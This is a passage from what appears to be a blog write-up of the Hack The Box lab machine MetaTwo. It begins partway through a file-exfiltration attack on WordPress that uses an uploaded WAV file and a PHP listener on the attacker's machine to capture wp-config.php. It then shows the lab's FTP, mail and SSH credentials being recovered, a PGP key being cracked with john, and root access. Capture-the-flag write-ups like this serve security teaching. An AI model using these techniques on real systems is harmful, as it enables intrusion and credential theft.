+</span><span class="gp">$</span>myfile <span class="o">=</span> fopen<span class="o">(</span><span class="s2">"tempfile.txt"</span>, <span class="s2">"w"</span><span class="o">)</span> or die<span class="o">(</span><span class="s2">"unable to open file!"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">$</span>fixed <span class="o">=</span> str_replace<span class="o">(</span><span class="s1">' '</span>, <span class="s1">'+'</span>, <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'p'</span><span class="o">])</span><span class="p">;</span>
+<span class="gp">fwrite($</span>myfile, zlib_decode<span class="o">(</span>base64_decode<span class="o">(</span><span class="nv">$fixed</span><span class="o">)))</span>
+<span class="gp">?&gt;</span></code></pre></figure>
+
+<p>Start php server</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>php <span class="nt">-S</span> 0.0.0.0:9001
+<span class="go">
+[Mon Apr 24 09:06:14 2023] PHP 8.2.2 Development Server (http://0.0.0.0:9001) started</span></code></pre></figure>
+
+<p>Upload exploit.wav</p>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m11.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>This saved wp-config.php to tempfile.txt.  From wp_config.php we find ftp credentials.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>tempfile.txt
+<span class="go">
+</span><span class="c">...
+</span><span class="go">
+</span><span class="gp">define( 'FTP_USER', 'metapress.htb' );</span><span class="w">
+</span><span class="gp">define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );</span><span class="w">
+</span><span class="go">
+</span><span class="c">...</span></code></pre></figure>
+
+<h2 id="enumerating-ftp">Enumerating FTP</h2>
+
+<p>Logging into the ftp server using the credentials we found in wp-config.php, we are able to find the user’s credentials for <code class="language-plaintext highlighter-rouge">jnelson</code> in the file <code class="language-plaintext highlighter-rouge">send_email.php</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>ftp <span class="si">$(</span><span class="nb">cat </span>ip<span class="si">)</span>
+<span class="go">Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:kali): metapress.htb
+331 Password required for metapress.htb
+Password: 
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||1341|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
+226 Transfer complete
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">cd </span>mailer
+<span class="go">250 CWD command successful
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||9274|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
+226 Transfer complete
+</span><span class="gp">ftp&gt;</span><span class="w"> </span>get send_email.php</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>send_email.php 
+<span class="go">&lt;?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+</span><span class="c">...
+</span><span class="go">
+
+</span><span class="gp">$</span>mail-&gt;Host <span class="o">=</span> <span class="s2">"mail.metapress.htb"</span><span class="p">;</span>
+<span class="gp">$</span>mail-&gt;SMTPAuth <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>                          
+<span class="gp">$</span>mail-&gt;Username <span class="o">=</span> <span class="s2">"jnelson@metapress.htb"</span><span class="p">;</span>                 
+<span class="gp">$</span>mail-&gt;Password <span class="o">=</span> <span class="s2">"Cb4_JmWM8zUZWMu@Ys"</span><span class="p">;</span>                           
+<span class="gp">$</span>mail-&gt;SMTPSecure <span class="o">=</span> <span class="s2">"tls"</span><span class="p">;</span>                           
+<span class="gp">$</span>mail-&gt;Port <span class="o">=</span> 587<span class="p">;</span>                                   
+<span class="go">
+</span><span class="c">...
+</span><span class="go">
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>ssh jnelson@10.10.11.186        
+<span class="go">jnelson@10.10.11.186's password: 
+</span><span class="gp">Linux meta2 5.10.0-19-amd64 #</span>1 SMP Debian 5.10.149-2 <span class="o">(</span>2022-10-21<span class="o">)</span> x86_64
+<span class="go">
+</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
+</span><span class="go">the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
+</span><span class="gp">jnelson@meta2:~$</span><span class="w"> </span></code></pre></figure>
+
+<h2 id="root">Root</h2>
+
+<p>In the home directory of jnelson we find <code class="language-plaintext highlighter-rouge">.passpie</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">jnelson@meta2:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 32
+drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
+drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
+</span><span class="gp">lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -&gt;</span><span class="w"> </span>/dev/null
+<span class="go">-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
+-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
+drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
+-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
+-rw-r----- 1 root    jnelson   33 Apr 24 13:40 user.txt</span></code></pre></figure>
+
+<p>During manual enumeration of the directory we find <code class="language-plaintext highlighter-rouge">~/.passpie/ssh/root.pass</code> which appears to contain a PGP encrypted secret that looks like the password for root.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">jnelson@meta2:~/.passpie$</span><span class="w"> </span><span class="nb">cat </span>ssh/root.pass 
+<span class="go">comment: ''
+fullname: root@ssh
+login: root
+modified: 2022-06-26 08:58:15.621572
+name: ssh
+password: '-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE-----
+
+  '</span></code></pre></figure>
+
+<p>Additionally, we find a private PGP key located in <code class="language-plaintext highlighter-rouge">~/.passpie/.keys</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">jnelson@meta2:~/.passpie$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
+drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
+-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
+-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh</span></code></pre></figure>
+
+<p>We copy over the private PGP key and use <code class="language-plaintext highlighter-rouge">john</code> to crack the password for the key.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo/root2]
+</span><span class="gp">└─$</span><span class="w"> </span>vi private_key  
+<span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo/root2]
+</span><span class="gp">└─$</span><span class="w"> </span>gpg2john private_key <span class="o">&gt;</span>private_key_hash
+<span class="go">
+File private_key
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo/root2]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>private_key_hash 
+<span class="gp">Passpie:$</span>gpg<span class="nv">$*</span>17<span class="k">*</span>54<span class="k">*</span>3072<span class="k">*</span>e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0<span class="k">*</span>3<span class="k">*</span>254<span class="k">*</span>2<span class="k">*</span>7<span class="k">*</span>16<span class="k">*</span>21d36a3443b38bad35df0f0e2c77f6b9<span class="k">*</span>65011712<span class="k">*</span>907cb55ccb37aaad:::Passpie <span class="o">(</span>Auto-generated by Passpie<span class="o">)</span> &lt;passpie@local&gt;::private_key
+<span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo/root2]
+</span><span class="gp">└─$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt private_key_hash 
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+blink182         (Passpie)     
+1g 0:00:00:03 DONE (2023-04-24 10:46) 0.3164g/s 51.89p/s 51.89c/s 51.89C/s ginger..blink182
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. </span></code></pre></figure>
+
+<p>Using an online PGP decrypter we are able to find the password for root using the previously discovered pgp message in <code class="language-plaintext highlighter-rouge">root.pass</code>, private key in <code class="language-plaintext highlighter-rouge">.keys</code>, and the password <code class="language-plaintext highlighter-rouge">blink182</code>.</p>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/12.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>We can now su to root.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">jnelson@meta2:~/.passpie$</span><span class="w"> </span>su root
+<span class="go">Password: 
+</span><span class="gp">root@meta2:/home/jnelson/.passpie#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span><span class="gp">root@meta2:/home/jnelson/.passpie#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>]]></content><author><name></name></author><category term="SQLi" /><category term="CVE" /><category term="wordpress" /><category term="hack-the-box" /><category term="easy" /><summary type="html"><![CDATA[A walkthrough of Hack The Box's Metatwo.]]></summary></entry></feed>
